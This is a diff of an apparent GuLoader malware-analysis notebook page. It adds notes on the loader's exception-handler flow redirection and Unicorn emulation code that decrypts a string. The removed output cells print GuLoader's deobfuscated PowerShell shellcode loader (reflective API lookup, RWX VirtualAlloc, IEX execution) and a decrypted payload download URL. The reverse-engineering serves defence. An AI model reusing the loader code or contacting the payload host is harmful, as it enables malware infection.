@@ -79,7 +79,7 @@ window.onload = wrap_img;
        • <span class="read-time" title="Estimated read time">
     
     
-      6 min read
+      8 min read
     
 </span></p>
 
@@ -169,6 +169,8 @@ window.onload = wrap_img;
 <li class="toc-entry toc-h4"><a href="#Shellcode-Loader">Shellcode Loader </a></li>
 <li class="toc-entry toc-h4"><a href="#Guloader-Shellcode-Stage-1">Guloader Shellcode Stage 1 </a></li>
 <li class="toc-entry toc-h4"><a href="#Guloader-Shellcode-Stage-2">Guloader Shellcode Stage 2 </a></li>
+<li class="toc-entry toc-h4"><a href="#VEH-Program-Flow-Redirection">VEH Program Flow Redirection </a></li>
+<li class="toc-entry toc-h4"><a href="#String-Decryption">String Decryption </a></li>
 </ul>
 </li>
 </ul>
@@ -200,6 +202,7 @@ window.onload = wrap_img;
 <li><a href="https://www.spamhaus.com/resource-center/dissecting-the-new-shellcode-based-variant-of-guloader-cloudeye/">Dissecting the new shellcode-based variant of GuLoader (CloudEyE)</a></li>
 <li><a href="https://www.fortinet.com/blog/threat-research/spoofed-saudi-purchase-order-drops-guloader-part-two">Spoofed Saudi Purchase Order Drops GuLoader – Part 2</a></li>
 <li><a href="https://www.crowdstrike.com/blog/guloader-dissection-reveals-new-anti-analysis-techniques-and-code-injection-redundancy/">Malware Analysis: GuLoader Dissection Reveals New Anti-Analysis Techniques and Code Injection Redundancy (published after our notes)</a></li>
+<li><a href="https://github.com/alexander-hanel/unicorn-engine-noteshttps://github.com/alexander-hanel/unicorn-engine-notes">Alex Hanel Unicorn Notes</a></li>
 </ul>
 
 </div>
@@ -266,22 +269,6 @@ window.onload = wrap_img;
 </div>
 </div>
 
-<div class="output_wrapper">
-<div class="output">
-
-<div class="output_area">
-
-
-
-<div class="output_text output_subarea output_execute_result">
-<pre>93703</pre>
-</div>
-
-</div>
-
-</div>
-</div>
-
 </div>
     
 
@@ -308,22 +295,6 @@ window.onload = wrap_img;
 </div>
 </div>
 
-<div class="output_wrapper">
-<div class="output">
-
-<div class="output_area">
-
-
-
-<div class="output_text output_subarea output_execute_result">
-<pre>'0x539'</pre>
-</div>
-
-</div>
-
-</div>
-</div>
-
 </div>
     
 
@@ -338,22 +309,6 @@ window.onload = wrap_img;
 </pre></div>
 
     </div>
-</div>
-</div>
-
-<div class="output_wrapper">
-<div class="output">
-
-<div class="output_area">
-
-
-
-<div class="output_text output_subarea output_execute_result">
-<pre>'0x100000000'</pre>
-</div>
-
-</div>
-
 </div>
 </div>
 
@@ -374,22 +329,6 @@ window.onload = wrap_img;
 </div>
 </div>
 
-<div class="output_wrapper">
-<div class="output">
-
-<div class="output_area">
-
-
-
-<div class="output_text output_subarea output_execute_result">
-<pre>'0x61'</pre>
-</div>
-
-</div>
-
-</div>
-</div>
-
 </div>
     
 
@@ -404,22 +343,6 @@ window.onload = wrap_img;
 </pre></div>
 
     </div>
-</div>
-</div>
-
-<div class="output_wrapper">
-<div class="output">
-
-<div class="output_area">
-
-
-
-<div class="output_text output_subarea output_execute_result">
-<pre>768</pre>
-</div>
-
-</div>
-
 </div>
 </div>
 
@@ -447,22 +370,6 @@ window.onload = wrap_img;
 </div>
 </div>
 
-<div class="output_wrapper">
-<div class="output">
-
-<div class="output_area">
-
-
-
-<div class="output_text output_subarea output_execute_result">
-<pre>b"ntdll\xcc\xddC\x01\x1e%\xdc\n\x85\x03r\x08O|\xc7QZ\xf9B\x8bX\x8f!\xd1\xf3zY'\xe2\xc0\xd2wL\xe3F\xa1\xb9\x8e\t\xbbCj&gt;\x86\xd5XcG\x14@"</pre>
-</div>
-
-</div>
-
-</div>
-</div>
-
 </div>
     
 
@@ -483,22 +390,6 @@ window.onload = wrap_img;
 </pre></div>
 
     </div>
-</div>
-</div>
-
-<div class="output_wrapper">
-<div class="output">
-
-<div class="output_area">
-
-
-
-<div class="output_text output_subarea output_execute_result">
-<pre>b'ntdll'</pre>
-</div>
-
-</div>
-
 </div>
 </div>
 
@@ -527,30 +418,6 @@ window.onload = wrap_img;
 </div>
 </div>
 
-<div class="output_wrapper">
-<div class="output">
-
-<div class="output_area">
-
-<div class="output_subarea output_stream output_stdout output_text">
-<pre>dee3b942
-</pre>
-</div>
-</div>
-
-<div class="output_area">
-
-
-
-<div class="output_text output_subarea output_execute_result">
-<pre>b'http://bounceclick.live/VVB/COrg_RYGGqN229.binb\xc7\xb6E\x8b\xe1jq\n=\x13\x1c9Lz\x05\xe1&gt;1\xc6\xde(_y\xa1`\x88\x19g\xe8=k\xfd\xab\x04\xbd\x83\x046\x99\xb1\xef8P\xeb\x1fal\xe6\xf24\x1c\\q'</pre>
-</div>
-
-</div>
-
-</div>
-</div>
-
 </div>
     
 
@@ -565,22 +432,6 @@ window.onload = wrap_img;
 </pre></div>
 
     </div>
-</div>
-</div>
-
-<div class="output_wrapper">
-<div class="output">
-
-<div class="output_area">
-
-
-
-<div class="output_text output_subarea output_execute_result">
-<pre>'0x2e'</pre>
-</div>
-
-</div>
-
 </div>
 </div>
 
@@ -723,83 +574,6 @@ window.onload = wrap_img;
 </pre></div>
 
     </div>
-</div>
-</div>
-
-<div class="output_wrapper">
-<div class="output">
-
-<div class="output_area">
-
-<div class="output_subarea output_stream output_stdout output_text">
-<pre>
-Function HTB {        param([String]$Humanmummy152);
-        $Sprjtende = New-Object byte[] ($Humanmummy152.Length / 2);
-        For($Stuphe=0; $Stuphe -lt $Humanmummy152.Length; $Stuphe+=2){                
-            $Sprjtende[$Stuphe/2] = [convert]::ToByte($Humanmummy152.Substring($Stuphe, 2), 16);
-            $Sprjtende[$Stuphe/2] = ($Sprjtende[$Stuphe/2] -bxor 141);
-        }       [String][System.Text.Encoding]::ASCII.GetString($Sprjtende);
-}$Fitchet0='System.dll';
-$Fitchet1='Microsoft.Win32.UnsafeNativeMethods';
-$Fitchet2='GetProcAddress';
-$Fitchet3='System.Runtime.InteropServices.HandleRef';
-$Fitchet4='string';
-$Fitchet5='GetModuleHandle';
-$Fitchet6='RTSpecialName, HideBySig, Public';
-$Fitchet7='Runtime, Managed';
-$Fitchet8='ReflectedDelegate';
-$Fitchet9='InMemoryModule';
-$udvalgsprocedure0='MyDelegateType';
-$udvalgsprocedure1='Class, Public, Sealed, AnsiClass, AutoClass';
-$udvalgsprocedure2='Invoke';
-$udvalgsprocedure3='Public, HideBySig, NewSlot, Virtual';
-$udvalgsprocedure4='VirtualAlloc';
-$udvalgsprocedure5='ntdll';
-$udvalgsprocedure6='NtProtectVirtualMemory';
-$udvalgsprocedure7='IEX';
-$udvalgsprocedure8='\';
-Set-Alias -name udvalgsprocedure9 -value $udvalgsprocedure7;
-function fkp {Param ($Ries, $Negeringsfunktionens)     ;
-$Kabar0 ='$Unabdicative = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split($udvalgsprocedure8)[-1].Equals($Fitchet0) }).GetType($Fitchet1)';
-udvalgsprocedure9 $Kabar0;
-$Kabar5 = '$Spidshammeres = $Unabdicative.GetMethod($Fitchet2, [Type[]] @($Fitchet3, $Fitchet4))';
-udvalgsprocedure9 $Kabar5;
-$Kabar1 = 'return $Spidshammeres.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($Unabdicative.GetMethod($Fitchet5)).Invoke($null, @($Ries)))), $Negeringsfunktionens))';
-udvalgsprocedure9 $Kabar1;
-}function GDT {Param ([Parameter(Position = 0, Mandatory = $True)] [Type[]] $Ambilaevous,[Parameter(Position = 1)] [Type] $Malmy = [Void]);
-$Kabar2 = '$Borneo = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName($Fitchet8)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule($Fitchet9, $false).DefineType($udvalgsprocedure0, $udvalgsprocedure1, [System.MulticastDelegate])';
-udvalgsprocedure9 $Kabar2;
-$Kabar3 = '$Borneo.DefineConstructor($Fitchet6, [System.Reflection.CallingConventions]::Standard, $Ambilaevous).SetImplementationFlags($Fitchet7)';
-udvalgsprocedure9 $Kabar3;
-$Kabar4 = '$Borneo.DefineMethod($udvalgsprocedure2, $udvalgsprocedure3, $Malmy, $Ambilaevous).SetImplementationFlags($Fitchet7)';
-udvalgsprocedure9 $Kabar4;
-$Kabar5 = 'return $Borneo.CreateType()';
-udvalgsprocedure9 $Kabar5   ;
-}$Nonperforated = 'kernel32';
-$Brndselsforbrug = 'user32';
-$Sottishness03 = 'GetConsoleWindow';
-$Sottishness00='ShowWindow';
-$Kabar6 = '$jordfordelingernes = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((fkp $Nonperforated $udvalgsprocedure4), (GDT @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))';
-udvalgsprocedure9 $Kabar6;
-$Sottishness01 = '$nondipterous = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((fkp $Brndselsforbrug $Sottishness00), (GDT @([IntPtr], [UInt32]) ([IntPtr])))';
-udvalgsprocedure9 $Sottishness01;
-$Sottishness02 = '$Downcried = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((fkp $Nonperforated $Sottishness03), (GDT @([IntPtr]) ([IntPtr])))';
-udvalgsprocedure9 $Sottishness02;
-$Kabar7 = '$Uncultivable = $Downcried.Invoke(0)';
-udvalgsprocedure9 $Kabar7;
-$Kabar7 = '$nondipterous.Invoke($Uncultivable, 0)';
-udvalgsprocedure9 $Kabar7;
-$Sottishness04 = fkp $udvalgsprocedure5 $udvalgsprocedure6;
-$Kabar7 = '$Casuistically3 = $jordfordelingernes.Invoke([IntPtr]::Zero, 316, 0x3000, 0x40)';
-udvalgsprocedure9 $Kabar7;
-$Kabar8 = '$Unsaintliness = $jordfordelingernes.Invoke([IntPtr]::Zero, 0x100000, 0x3000, 0x4)';
-udvalgsprocedure9 $Kabar8;
-$Casuistically2="rgmlfaelooallpmlvlnvuislrreellesglrrslrndsrfooorrtyvenaudpoubrpdgaaaslraoddernnoanlergpaeyeefaonoaiitiiuahhglkkaedazrrafrecrcieennipurralanidnkeueraeapeaoaoeofrreevlrxuutefyinuireraanslealiieaaodrrclieeiuauraorreeoeboeojjluricahanieasaneueuaeleohnmriarlioaaegtralioleraonearouvoieobohrveneeaafodeiiitinotdieieplaleeideoooeaaorrntiaiaotopnehekeatlriovaaadlnaoionauitinuaalnrevioeeetspnleeenoloeeeouuinrpuaijojoaovaoarroyopoaynupnoamouamsmpdundpuoinruuraroyanrsenifeaeuopernoeiilauhcricaokcarodvoorbaioelcloauemaauuijtlrrrntaarreaoutneayenpkrwieeokenleioeerkoseeouapauunoleydriakeaexaneeupiuhaiovantesneoeuaaaigyokhieoiroarueivuoetnliisnunyeiaupogylhieetuaoutejdioleakriiaaeheaictaeuaeonutlexseosfkoaeeepknkrnpueeaoeiuamyhvenpluoymohaauoiyaostiuindklaeyapeayloaoaasnyehoorerpeevraooiietoaaeeooieloiirsayadnaeaaaiftrooidvalauieaeearnonaevuuyaerelkoaduecoayonsaroieueiaiiovunriisolkosuaaroeayiuoiiaureeyatdnureafnnaevhnhaitlryrrkupuofbmrrpiunnuakarkalohnuoudeyriegnrdejivnonnnkevruugeoeleoanalahsaoylapenujpiueemiieuludkudeeesloreieeleiaarlaohvnouarurlveurrorumetnvnpruinnhremoleiikooialteieersidbpigneuoprloelyvooyavennipaaiepafenokaeiaeraeteiweoevgakrouaktatilsunqleoefnugiaevaeamnuarnoiinelr"
-
-</pre>
-</div>
-</div>
-
 </div>
 </div>
 
@@ -1000,11 +774,321 @@ $ShellCodeEntry.Invoke($Buffer2_RW , fkp ntdll NtProtectVirtualMemory)
 <div class="cell border-box-sizing text_cell rendered">
 <div class="inner_cell">
 <div class="text_cell_render border-box-sizing rendered_html">
-<p><strong>TODO</strong> our trick didn't work, we will have to investigate stage2 further to determine where the c2 is stored.</p>
+<h4 id="VEH-Program-Flow-Redirection">
+<a class="anchor" href="#VEH-Program-Flow-Redirection" aria-hidden="true"><span class="octicon octicon-link"></span></a>VEH Program Flow Redirection<a class="anchor-link" href="#VEH-Program-Flow-Redirection"> </a>
+</h4>
+<p>As described in both the <a href="https://www.crowdstrike.com/blog/guloader-dissection-reveals-new-anti-analysis-techniques-and-code-injection-redundancy/">CrowdStrike</a> and <a href="https://unit42.paloaltonetworks.com/guloader-variant-anti-analysis/">Unit42</a> blogs Guloader uses an VEH to both do some anti-debugging checks and redirect the program flow.</p>
+<p>The way this works is the VEH redirects EIP using a decoding routing based on byte the follows the INT3 (<code>cc</code>) instruction which caused the excpetion. In the code <code>jmp</code> instructions have been replaced with INT3 and an encoded byte. There is a nice <a href="https://github.com/pan-unit42/public_tools/blob/master/idapython-guloader-anti-analysis/guloader_veh_anti_analysis_.py">IDA Python plugin</a> from Unit42 that will automatically replace the INT3 code with JMPs. ** Remember you need to update the XOR byte in the plugin for the version of guloader you are analyzing.</p>
 
 </div>
 </div>
 </div>
+<div class="cell border-box-sizing text_cell rendered">
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h4 id="String-Decryption">
+<a class="anchor" href="#String-Decryption" aria-hidden="true"><span class="octicon octicon-link"></span></a>String Decryption<a class="anchor-link" href="#String-Decryption"> </a>
+</h4>
+</div>
+</div>
+</div>
+    
+    
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">unicorn</span> <span class="k">as</span> <span class="nn">uc</span>
+<span class="kn">import</span> <span class="nn">struct</span>
+
+<span class="c1"># This is just to print each instruction address as it's emulated</span>
+<span class="k">def</span> <span class="nf">hook_call</span><span class="p">(</span><span class="n">uc_engine</span><span class="p">,</span> <span class="n">mem_type</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
+    <span class="n">eip</span> <span class="o">=</span> <span class="n">uc_engine</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">x86_const</span><span class="o">.</span><span class="n">UC_X86_REG_EIP</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"EIP: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">eip</span><span class="o">-</span><span class="mh">0x10000</span><span class="p">)</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="kc">True</span>
+
+
+<span class="n">buf</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'/tmp/Guloader_stage_2.bin'</span><span class="p">,</span> <span class="s1">'rb'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+
+<span class="n">uc_engine</span> <span class="o">=</span> <span class="n">uc</span><span class="o">.</span><span class="n">Uc</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">UC_ARCH_X86</span><span class="p">,</span> <span class="n">uc</span><span class="o">.</span><span class="n">UC_MODE_32</span><span class="p">)</span>
+<span class="n">STACK_ADDR</span> <span class="o">=</span> <span class="mh">0x900000</span>
+<span class="n">CODE_ADDR</span> <span class="o">=</span> <span class="mh">0x10000</span>
+
+<span class="c1"># Load shellcode into mem</span>
+<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">CODE_ADDR</span><span class="p">,</span> <span class="mh">0x300000</span><span class="p">,</span> <span class="n">uc</span><span class="o">.</span><span class="n">UC_PROT_ALL</span><span class="p">)</span>
+<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">CODE_ADDR</span><span class="p">,</span> <span class="n">buf</span><span class="p">)</span>
+
+<span class="c1"># Set shellcode entrypoint</span>
+<span class="n">uc_engine</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">x86_const</span><span class="o">.</span><span class="n">UC_X86_REG_EIP</span><span class="p">,</span> <span class="n">CODE_ADDR</span><span class="p">)</span>
+
+<span class="c1"># Setup the stack memory</span>
+<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">STACK_ADDR</span> <span class="o">-</span> <span class="mh">0x100000</span><span class="p">,</span> <span class="mh">0x200000</span><span class="p">,</span> <span class="n">uc</span><span class="o">.</span><span class="n">UC_PROT_ALL</span><span class="p">)</span>
+<span class="n">uc_engine</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">x86_const</span><span class="o">.</span><span class="n">UC_X86_REG_ESP</span><span class="p">,</span> <span class="n">STACK_ADDR</span><span class="p">)</span>
+<span class="n">uc_engine</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">x86_const</span><span class="o">.</span><span class="n">UC_X86_REG_EBP</span><span class="p">,</span> <span class="n">STACK_ADDR</span><span class="p">)</span>
+
+
+<span class="c1"># This is our hook just for fun</span>
+<span class="n">hook1</span> <span class="o">=</span> <span class="n">uc_engine</span><span class="o">.</span><span class="n">hook_add</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">UC_HOOK_CODE</span><span class="p">,</span> <span class="n">hook_call</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>
+
+<span class="c1"># Setup our arguments/buffers</span>
+
+<span class="n">EAX_BUFF</span> <span class="o">=</span> <span class="mh">0x500000</span>
+<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">EAX_BUFF</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">uc</span><span class="o">.</span><span class="n">UC_PROT_ALL</span><span class="p">)</span>
+<span class="n">uc_engine</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">x86_const</span><span class="o">.</span><span class="n">UC_X86_REG_EAX</span><span class="p">,</span> <span class="n">EAX_BUFF</span><span class="p">)</span>
+
+<span class="c1"># This sort of works like a 'push' to push the buffer address onto the stack</span>
+<span class="n">EBP_BUFF</span> <span class="o">=</span> <span class="mh">0x600000</span>
+<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">EBP_BUFF</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">uc</span><span class="o">.</span><span class="n">UC_PROT_ALL</span><span class="p">)</span>
+<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">STACK_ADDR</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;I'</span><span class="p">,</span><span class="n">EBP_BUFF</span><span class="p">))</span>
+
+
+<span class="n">EDI_BUFF</span> <span class="o">=</span> <span class="mh">0x700000</span>
+<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">EDI_BUFF</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">uc</span><span class="o">.</span><span class="n">UC_PROT_ALL</span><span class="p">)</span>
+<span class="n">uc_engine</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">x86_const</span><span class="o">.</span><span class="n">UC_X86_REG_EDI</span><span class="p">,</span> <span class="n">EDI_BUFF</span><span class="p">)</span>
+
+
+<span class="n">ARG_BUFF</span> <span class="o">=</span> <span class="mh">0x400000</span>
+<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">ARG_BUFF</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">uc</span><span class="o">.</span><span class="n">UC_PROT_ALL</span><span class="p">)</span>
+<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">STACK_ADDR</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;I'</span><span class="p">,</span><span class="n">ARG_BUFF</span><span class="p">))</span>
+
+<span class="n">FN_START</span> <span class="o">=</span> <span class="mh">0X08A55</span> <span class="o">+</span> <span class="n">CODE_ADDR</span>
+<span class="n">FN_END</span> <span class="o">=</span> <span class="mh">0x08D3F</span> <span class="o">+</span> <span class="n">CODE_ADDR</span>
+
+<span class="n">uc_engine</span><span class="o">.</span><span class="n">emu_start</span><span class="p">(</span><span class="n">FN_START</span><span class="p">,</span> <span class="n">FN_END</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+
+<span class="c1">#out_eip = uc_engine.reg_read(uc.x86_const.UC_X86_REG_EIP)</span>
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+<div class="output_wrapper">
+<div class="output">
+
+<div class="output_area">
+
+<div class="output_subarea output_stream output_stdout output_text">
+<pre>EIP: 0x8a55
+EIP: 0x8a57
+EIP: 0x8a59
+EIP: 0x8a5d
+EIP: 0x8a63
+EIP: 0x8a69
+EIP: 0x8a6f
+EIP: 0x8a75
+EIP: 0x8a77
+EIP: 0x8a7d
+EIP: 0x8a80
+EIP: 0x8a85
+EIP: 0x8a8b
+EIP: 0x8a8d
+EIP: 0x8a90
+EIP: 0x8a96
+EIP: 0x8a98
+EIP: 0x8a9e
+EIP: 0x8aa0
+EIP: 0x8aa2
+EIP: 0x8aa8
+EIP: 0x8aae
+EIP: 0x8ab4
+EIP: 0x8b0e
+EIP: 0x8b11
+EIP: 0x8b17
+EIP: 0x8b19
+EIP: 0x8b1f
+EIP: 0x8b21
+EIP: 0x8b27
+EIP: 0x8b2d
+EIP: 0x8b30
+EIP: 0x8b35
+EIP: 0x8b39
+EIP: 0x8b3b
+EIP: 0x8b40
+EIP: 0x8b45
+EIP: 0x8b47
+EIP: 0x8b4c
+EIP: 0x8b4e
+EIP: 0x8b54
+EIP: 0x8b56
+EIP: 0x8b96
+EIP: 0x8b9c
+EIP: 0x8ba2
+EIP: 0x8ba8
+EIP: 0x8baa
+EIP: 0x8bb0
+EIP: 0x8bb2
+EIP: 0x8bb5
+EIP: 0x8bbb
+EIP: 0x8bbd
+EIP: 0x8bc3
+EIP: 0x8bc9
+EIP: 0x8bcc
+EIP: 0x8bce
+EIP: 0x8bd4
+EIP: 0x8bd6
+EIP: 0x8bdc
+EIP: 0x8be2
+EIP: 0x8be8
+EIP: 0x8bf2
+EIP: 0x8bf4
+EIP: 0x8bf7
+EIP: 0x8c01
+EIP: 0x8c0b
+EIP: 0x8c0d
+EIP: 0x8c10
+EIP: 0x8c1a
+EIP: 0x8c1c
+EIP: 0x8c1e
+EIP: 0x8c1f
+EIP: 0x8c25
+EIP: 0x8c1e
+EIP: 0x8c1f
+EIP: 0x8c25
+EIP: 0x8c1e
+EIP: 0x8c1f
+EIP: 0x8c25
+EIP: 0x8c27
+EIP: 0x8c28
+EIP: 0x8c2e
+EIP: 0x8c34
+EIP: 0x8c36
+EIP: 0x8c3c
+EIP: 0x8c3e
+EIP: 0x8c40
+EIP: 0x8c46
+EIP: 0x8c4c
+EIP: 0x8c56
+EIP: 0x8c58
+EIP: 0x8c62
+EIP: 0x8c6c
+EIP: 0x8c6e
+EIP: 0x8c78
+EIP: 0x8c7b
+EIP: 0x8c7e
+EIP: 0x8c7f
+EIP: 0x8c85
+EIP: 0x8c7b
+EIP: 0x8c7e
+EIP: 0x8c7f
+EIP: 0x8c85
+EIP: 0x8c7b
+EIP: 0x8c7e
+EIP: 0x8c7f
+EIP: 0x8c85
+EIP: 0x8c87
+EIP: 0x8c88
+EIP: 0x8cda
+EIP: 0x8cdc
+EIP: 0x8ce2
+EIP: 0x8ce3
+EIP: 0x8ce5
+EIP: 0x8ceb
+EIP: 0x8ced
+EIP: 0x8cf3
+EIP: 0x8cf5
+EIP: 0x8cf7
+EIP: 0x8cfd
+EIP: 0x8d03
+EIP: 0x8d0d
+EIP: 0x8d0f
+EIP: 0x8d19
+EIP: 0x8d23
+EIP: 0x8d2d
+EIP: 0x8d2f
+EIP: 0x8d32
+EIP: 0x8d33
+EIP: 0x8d39
+EIP: 0x8d2f
+EIP: 0x8d32
+EIP: 0x8d33
+EIP: 0x8d39
+EIP: 0x8d2f
+EIP: 0x8d32
+EIP: 0x8d33
+EIP: 0x8d39
+EIP: 0x8d3b
+EIP: 0x8d3c
+</pre>
+</div>
+</div>
+
+</div>
+</div>
+
+</div>
+    
+
+    
+    
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="n">arg_buff_data</span> <span class="o">=</span> <span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">ARG_BUFF</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">)</span>
+
+<span class="n">data_len</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">'&lt;I'</span><span class="p">,</span> <span class="n">arg_buff_data</span><span class="p">[:</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">arg_buff_data</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">4</span><span class="o">+</span><span class="n">data_len</span><span class="p">]</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+<div class="output_wrapper">
+<div class="output">
+
+<div class="output_area">
+
+<div class="output_subarea output_stream output_stdout output_text">
+<pre>bytearray(b'n\x00M9\xd3\x1e\n\x8e\xa4\xc5&gt;\xea\xf76\xf5t \x07g\xcd')
+</pre>
+</div>
+</div>
+
+</div>
+</div>
+
+</div>
+    
+
+    
+    
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="n">xor_crypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+<div class="output_wrapper">
+<div class="output">
+
+<div class="output_area">
+
+
+
+<div class="output_text output_subarea output_execute_result">
+<pre>b'SOFTWARE\\AppDataLow\\'</pre>
+</div>
+
+</div>
+
+</div>
+</div>
+
+</div>
+    
+
 </div>
 
 
